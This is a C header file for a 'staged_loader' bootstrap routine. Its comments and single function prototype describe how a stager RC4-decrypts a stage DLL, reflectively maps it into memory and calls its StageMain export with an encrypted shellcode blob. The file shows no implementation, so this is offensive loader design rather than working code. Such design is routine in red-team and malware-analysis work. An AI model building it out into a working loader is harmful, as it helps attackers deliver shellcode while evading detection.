/*
 * staged_loader bootstrap - the shared "unpack the stage and run it" logic used
 * by every host (service/exe stager and the DLL host).
 *
 * The host supplies the packed artifacts (from stage_data.h) and the command
 * line; bootstrap RC4-decrypts the stage DLL, reflectively maps it, resolves
 * its StageMain export and calls it with the still-encrypted shellcode
 * blob/key. It owns the decrypted stage buffer and wipes it before returning.
 */
#ifndef STAGED_LOADER_BOOTSTRAP_H
#define STAGED_LOADER_BOOTSTRAP_H

#include <stddef.h>
#include <wchar.h>

/*
 * Returns StageMain's return value (0 on success), or -1 if the stage could
 * not be decrypted, mapped or resolved. The caller owns all pointers and
 * argv.
 */
int staged_loader_bootstrap(const unsigned char *enc_stage, size_t enc_stage_len,
                        const unsigned char *stage_key, size_t stage_key_len,
                        const unsigned char *enc_payload,
                        size_t enc_payload_len, const unsigned char *key,
                        size_t key_len, int argc, wchar_t **argv);

#endif /* STAGED_LOADER_BOOTSTRAP_H */
